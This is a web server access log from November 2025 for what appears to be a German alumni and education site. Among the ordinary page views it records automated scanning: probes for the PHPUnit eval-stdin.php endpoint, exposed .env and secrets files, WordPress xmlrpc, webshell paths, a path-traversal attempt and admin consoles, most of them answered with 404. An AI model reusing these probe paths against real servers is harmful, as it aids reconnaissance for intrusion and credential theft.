50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:10:42;;/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:10:44;;/vendor/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:10:46;;/vendor/phpunit/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:10:49;;/vendor/phpunit/phpunit/LICENSE/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:10:51;;/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:10:53;;/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:10:57;;/phpunit/phpunit/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:04;;/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:10;;/phpunit/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:16;;/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:22;;/lib/phpunit/phpunit/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:32;;/lib/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:37;;/lib/phpunit/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:41;;/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:44;;/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:49;;/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:11:55;;/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:12:00;;/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:12:06;;/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:12:18;;/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:12:32;;/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:12:46;;/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:12:53;;/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:12:58;;/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
50fa313bbd0c87ccbe9a7a6c917924800dad489bccb1cd4e7033909a6fdd66cf;2025-11-19 22:13:03;;/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
9381a638ea42b11a4f35a59c063f3246cd79bc228a026a3b88a93402f9654231;2025-11-19 22:24:07;/;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-19 22:30:18;/gruppen/interesse/marktforschung-und-analyse;/gruppen/interesse/marktforschung-und-analyse;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-19 22:40:11;/;/;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 22:48:19;/personen/alumni/details/kai-ingo-heidbuchel;/personen/alumni/details/kai-ingo-heidbuchel;GET;200
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:52:50;;/k8s/secrets.env;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:52:53;;/data/config.env;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:52:55;;/js/envConfig.js;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:53:00;;/data/konfig.env;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:53:02;;/nextjs/env.yaml;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:53:04;;/laravel/env.yml;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:53:05;;/nextjs/env.json;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:53:08;;/env_settings.py;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:53:14;;/demo/config.env;GET;404
ec7779294c4c7c5a5f975f5d1fc955a8e78044e3d04bf95b397a7898792e68f4;2025-11-19 22:53:16;;/env.development;GET;404
1f3012196123438344ca880f1eabdf45cf6bbeeedfbfbf858dce13ad076fbd9a;2025-11-19 23:01:27;;/;GET;200
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 23:02:00;/;/;GET;200
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:22;;//wp-includes/ID3/license.txt;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:23;;//feed/;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:24;;//xmlrpc.php?rsd;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:25;;//blog/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:26;;//web/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:26;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:27;;//wp/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:27;;//2020/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:28;;//2019/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:28;;//2021/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:29;;//shop/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:29;;//wp1/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:29;;//test/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:30;;//site/wp-includes/wlwmanifest.xml;GET;404
1775efa820de3b30571d90b29bb5907eaebe0de08532c6c7d526557c3f3a0e5f;2025-11-19 23:02:30;;//cms/wp-includes/wlwmanifest.xml;GET;404
6c470fc3f752400231fc8cdf84fa5825c74837254725b622ef41f49e2ee5898f;2025-11-19 23:15:41;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-19 23:16:26;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-19 23:16:26;;/;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-19 23:16:26;;/;GET;200
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:29;;/;GET;200
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:30;;//wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:31;;//xmlrpc.php?rsd;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:31;;/;GET;200
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:31;;//blog/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:32;;//web/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:32;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:32;;//website/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:32;;//wp/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:32;;//news/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:33;;//2018/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:33;;//2019/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:34;;//shop/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:34;;//wp1/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:34;;//test/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:34;;//media/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:35;;//wp2/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:35;;//site/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:35;;//cms/wp-includes/wlwmanifest.xml;GET;404
029cb9ad33cfe84401d8b5e68e23d0421da42d9732ce1b9d717b93aa9b20bdf5;2025-11-19 23:21:36;;//sito/wp-includes/wlwmanifest.xml;GET;404
d4315f6375245b6b8c738c6686a540b694826bf64fea4eca888785529ca88776;2025-11-19 23:24:23;;/;GET;200
189d79ce33364e3e60cfeca7db47b2541ce315f656346acea124e075ba086d1e;2025-11-19 23:28:16;;/dqgqoeCXckuwPtxov;GET;404
189d79ce33364e3e60cfeca7db47b2541ce315f656346acea124e075ba086d1e;2025-11-19 23:28:16;;/dqgqoeCXckuwPtxov;GET;404
0d079cc911f452bbc0cd2581736cc994bc3a8c0eec54c185f449116f96e09d1c;2025-11-19 23:31:05;;/;GET;200
0d079cc911f452bbc0cd2581736cc994bc3a8c0eec54c185f449116f96e09d1c;2025-11-19 23:31:28;;/sitemap.xml;GET;200
0d079cc911f452bbc0cd2581736cc994bc3a8c0eec54c185f449116f96e09d1c;2025-11-19 23:31:35;;/config.json;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 23:32:51;/gruppen/hobby/biologie;/gruppen/interesse/strategische-planung;GET;200
8b36fbbbab82c5abae6b93ecf77279a79d10872198237062c15b84f55b91e04d;2025-11-19 23:34:36;;/;GET;200
afbf86733594de0a80d6f3a5d157005b046a28cfe584d5920b5e48a25423a66d;2025-11-19 23:36:35;;/;GET;200
fbd08d5e2e4a3206c9cc57995fae3f0df4cfdcbc82e923dc003a07d22e9183d3;2025-11-19 23:39:36;;/;GET;200
a5752949571af38d5b638204ccf5235a6ea4f886d309c63f0b1e9745b9420893;2025-11-19 23:43:15;;/index.htm;GET;404
55ba1f31e330352661b43d3275dad2a303675546c75fe98bef1d75f73056674c;2025-11-19 23:47:39;;/;GET;200
165376da2735949a3547f555fe21fa16ca4c9a243fb9f23f2549d888a7b4dac9;2025-11-19 23:58:37;/;/;GET;200
3c94e2bbbf0fd73aeb866f9eb1206124dc7215969c7f0f260ffd0c9d062ef24b;2025-11-20 00:09:47;;/;GET;200
464a16814a5f0008e61ac6e7fde4ad60a8ee59305963c27ae32364aed8fee710;2025-11-20 00:17:51;;/personen/alumni/schule/164045;GET;200
301e666ea0c944e347b624f4972b2b977e5cdb3645f451e1a71103667a2da7a8;2025-11-20 00:32:54;;/;GET;200
0fb030a1041ed76148dee4889233bf0a64fed1d497d5c04969c23d08f799120e;2025-11-20 00:34:09;;/;GET;200
0e0ad6d06890c4bafff06b8abbba2e06e3c45c0b60dcd07ee5789ed7921a161d;2025-11-20 00:34:12;;/;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-20 00:35:53;;/;GET;200
c7f9f8cb140b5b79281d613260034446cd2e7ec91866d8b3a60f5c0e4f131703;2025-11-20 00:39:48;;/;GET;200
45d434f1978e2b5d57a26b6896f80b9d8fba990e514987cd7f24fd33d4017b7d;2025-11-20 00:40:44;;/personen/alumni/schule/MP001;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-20 00:45:52;;/;GET;200
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-20 00:46:39;;/nsn/..%5Cweb/env.bas;GET;404
a94dd6a2c69ac92df91e8afbb25a6a1426c11316a30399593472c164be1ba1c5;2025-11-20 00:58:17;;/;GET;200
df3ec42c151d689164950cd8196970c89060cc1f49f8c46f1c797e1e3570e44e;2025-11-20 01:01:00;;/themen?category=bildung;GET;200
99b33ff559c39c35709f095d5b63d748f22744c893696a24987c5f6572638a52;2025-11-20 01:02:47;;/;GET;200
1073a50c93265e54bd4c9f102d9a40eb8a6c0e60a044d4802e6b9b7e9b739638;2025-11-20 01:06:21;;/;GET;200
1073a50c93265e54bd4c9f102d9a40eb8a6c0e60a044d4802e6b9b7e9b739638;2025-11-20 01:06:22;;/themen/details/der-start-ins-studium;GET;200
1073a50c93265e54bd4c9f102d9a40eb8a6c0e60a044d4802e6b9b7e9b739638;2025-11-20 01:06:22;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-20 01:11:37;;/;GET;200
062e01079ca8880d3ded68039e2f23105e7559595565d63b76373cb0cd763990;2025-11-20 01:13:05;;/;GET;200
36b591a1be989e454634e7658d5743b60d47645422baf224e82c7cf100ef16ec;2025-11-20 01:15:11;;/shell;GET;404
8de4ddd7672a54a66eebd204c7a5271e8491caa3d60519a170e0057c4aa1ff5d;2025-11-20 01:15:35;;/webshell.php;GET;404
8de4ddd7672a54a66eebd204c7a5271e8491caa3d60519a170e0057c4aa1ff5d;2025-11-20 01:15:35;;/shell.php;GET;404
d9593e6ab4016e67b946b8e766fdb85daca7e35a3a1fa5f21a9234ef2c793b43;2025-11-20 01:16:04;;/;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-20 01:16:55;;/webui/;GET;404
8926896b40bcd8d36f76de8428de4703482d08eed81392aea9a3816ae1bb1908;2025-11-20 01:19:25;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
95774c63a9f18c1c5d157bd01f23eb3b44c8f9f3f80a18181af7f4a699c1155d;2025-11-20 01:21:56;;/;GET;200
013e27f49a1bb7ff64fedc6f8a670ccfa8a102282164eabd688e5d5955ad478a;2025-11-20 01:22:58;;/;GET;200
b3ecf7d4e3bee0f6d72ef57e7b6d566f799e7d4f3808a7b7f3a33a931d2d0f27;2025-11-20 01:25:53;;/webshell;GET;404
78056d2886c949721bc514fbddd3ac0055ab61339b6549bdbd82c5f78f8c4601;2025-11-20 01:29:30;;/personen/alumni/details/sebastian-langhorst;GET;200
a57942747c537f3932b7a0becc4d4315bf36755e10688510999660d73be87bcb;2025-11-20 01:34:51;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
6e9cf7261ef52110b8c283d90853e230532bf54fcf48eaee97e7070c4d80c65d;2025-11-20 01:36:35;;/geoserver/web/;GET;404
6497c40504fb64774b2d6d22efd484c8f2d1d8f61f65897dba1bb62497536c8d;2025-11-20 01:38:29;;/personen/alumni/schule/SHH001;GET;200
4de6a7f86877b8728ae6d3dfb012ed6b3428bfb6d0c9eba21889446b17e67c27;2025-11-20 01:46:45;;/;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:46:51;;/;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:46:52;;/;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:46:54;;/;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:46:56;;/;HEAD;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:46:57;;/;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:46:57;;/;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:46:57;;/login;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:47:00;;/about/allgemein;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:47:05;;/profile;GET;302
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:47:05;;/login;GET;200
8ac7fd98ad29571440c5b3a3e567bfd77b7bd4a416642cad4bf06d8bbbd95dd4;2025-11-20 01:47:08;;/rechtliches/datenschutz;GET;200
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:49:10;/;/;GET;200
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:49:56;/;/;GET;200
480169613ab2853e9614ceac01fdc71bc2ef00fce7837e7048285909fcb6ac08;2025-11-20 01:49:57;/favicon-32x32.png;/favicon-32x32.png;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:49:58;/helpdesk/WebObjects/Helpdesk.woa;/helpdesk/WebObjects/Helpdesk.woa;GET;404
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:50:19;/partymgr/control/main;/partymgr/control/main;GET;404
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:50:37;/solr/;/solr/;GET;404
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:50:48;/;/;GET;200
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:50:49;/WebInterface/;/WebInterface/;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:50:56;/sitecore/shell/sitecore.version.xml;/sitecore/shell/sitecore.version.xml;GET;404
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:51:02;/zabbix/favicon.ico;/zabbix/favicon.ico;GET;404
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:51:14;/static/historypage.js;/static/historypage.js;GET;404
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:51:19;/index.jsp;/index.jsp;GET;404
480169613ab2853e9614ceac01fdc71bc2ef00fce7837e7048285909fcb6ac08;2025-11-20 01:51:25;/login.do;/login.do;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:51:31;/owncloud/status.php;/owncloud/status.php;GET;404
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:51:37;/status.php;/status.php;GET;404
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:51:44;/ssi.cgi/Login.htm;/ssi.cgi/Login.htm;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:51:51;/OA_HTML/AppsLocalLogin.jsp;/OA_HTML/AppsLocalLogin.jsp;GET;404
480169613ab2853e9614ceac01fdc71bc2ef00fce7837e7048285909fcb6ac08;2025-11-20 01:51:59;/sugar_version.json;/sugar_version.json;GET;404
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:52:08;/license.txt;/license.txt;GET;404
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:52:15;/wp-json;/wp-json;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:52:21;/internal_forms_authentication;/internal_forms_authentication;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:52:27;/js/NewWindow_2_all.js;/js/NewWindow_2_all.js;GET;404
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:52:28;/api/session/properties;/api/session/properties;GET;404
46a9dc5bd7e568c09623f442efecd8c19665d2919dc44ff03b3fa81d9037868c;2025-11-20 01:52:34;;/;GET;200
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:52:36;/console;/console;GET;404
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:52:45;/identity;/identity;GET;404
480169613ab2853e9614ceac01fdc71bc2ef00fce7837e7048285909fcb6ac08;2025-11-20 01:52:53;/Telerik.Web.UI.WebResource.axd?type=rau;/Telerik.Web.UI.WebResource.axd?type=rau;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:53:01;/login.html;/login.html;GET;404
919b423e3335a8716750ae245bf5d23f12cb3ba5afcdfc0fcb0856cf6e8da5cd;2025-11-20 01:53:08;/jasperserver/login.html;/jasperserver/login.html;GET;404
74bf63cbdb78e85176959df996e96f0733f972f4aa7f4f239e21e25dceab8d42;2025-11-20 01:53:16;/jasperserver-pro/login.html;/jasperserver-pro/login.html;GET;404
480169613ab2853e9614ceac01fdc71bc2ef00fce7837e7048285909fcb6ac08;2025-11-20 01:53:23;/jasperserverTest/login.html;/jasperserverTest/login.html;GET;404
b22b4a6d0f28f76865460ac2f430605891c76219e76968a727ccc8ed9c4725ad;2025-11-20 01:53:28;/webfig/;/webfig/;GET;404
480169613ab2853e9614ceac01fdc71bc2ef00fce7837e7048285909fcb6ac08;2025-11-20 01:53:37;/showLogin.cc;/showLogin.cc;GET;404
a48714be194da4b82e659599357905f382794918c0fe7b574d904e3731ea5258;2025-11-20 02:01:23;;/personen/alumni/schule/MP004;GET;200
d91abd49a59d1895b092da92fd7cc9008f1a4548ebd97f9aa0990a36a6095bac;2025-11-20 02:08:51;;/;GET;200
66292f09e8b137393db9360228fb078ea68d8fe474eb089ec5386fdc9fad94a7;2025-11-20 02:09:23;;/personen/alumni/schule/07A05;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-20 02:13:34;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/5508;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-20 02:14:43;;/config/env/mailer_dsn_config.env;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-20 02:14:43;;/aws/umgebung/aws_env_config.json;GET;404
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-20 02:14:57;/personen/all/4;/personen/alumni/details/jeanette-stephan;GET;200
e58dafd7faa0a6fc5d0292b8e7bbd2926b663f6653a7fc38ec9b3632ad7d45a9;2025-11-20 02:16:25;;/;GET;200
00164a83b5a875b2826bdb37bbce606a753d7e070e7c70d0d699a3ca4266bcb1;2025-11-20 02:17:15;;/personen/alumni/schule/01A04;GET;200
fda6eea33624d168f01e902ffc5c85c0c48e3e78f80dfe4a0523cde8f947650c;2025-11-20 02:24:22;;/personen/alumni/schule/04A04;GET;200
567b0c5800289d10a744dc55617e02e0bd20c2552250e3d35c622b2bdf32246e;2025-11-20 02:30:26;;/;GET;200
1bd13aa208a1f98259baa7e15c961b703d5d95eb3866042db443a923517430dc;2025-11-20 02:31:40;;/personen/alumni/schule/03A04;GET;200
44027419eabf3d6d23db5f87c582500ee4842b4225d2ab921043ea2103e2d8a3;2025-11-20 02:34:04;;/personen;GET;200
3560874ae1ae905356c03ea7650bbe1cf31bafd928e5e0e831b381011f467765;2025-11-20 02:39:02;;/personen/alumni/schule/10A04;GET;200
6e3a1b1a350f2ec7167b446b084fd9c6b801015569308a554c2a668ed26ddbad;2025-11-20 02:40:36;;/.well-known/traffic-advice;GET;404
c5741a378477f1b29e88ad72eeb91ea8a50e5ea824d82b7fa6ac79bf2e6a9032;2025-11-20 02:43:11;;/themen/details/netzwerken-leicht-gemacht;GET;404
eabda301b9d9eebf0054b243db64ba7e90853816df31f85ef6a242801f69c7bb;2025-11-20 02:43:18;;/aktuelles/meldungen?category=wissenschaft;GET;200
4ec54088c379f2f16411c8143a4e7da2bd4fd73c6c5b3355a89cfec7774d7ebb;2025-11-20 02:46:32;;/personen/alumni/schule/9004;GET;200
a0f4d2d3869c765a0ec69a8ba65f522de59824a47ad8dad613b39128bf494597;2025-11-20 02:50:26;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
98aaa6d0ed45eb2c8cf092034c75ff8eef7ca3430bdd66e2a43fb620a44b37bb;2025-11-20 02:53:08;;/;GET;200
728bd1e94ebe7911c04a0ca18a1ac14dfe3d7c615339c747c58d06ba628eb9d5;2025-11-20 02:53:24;;/personen/alumni/schule/BW001;GET;200
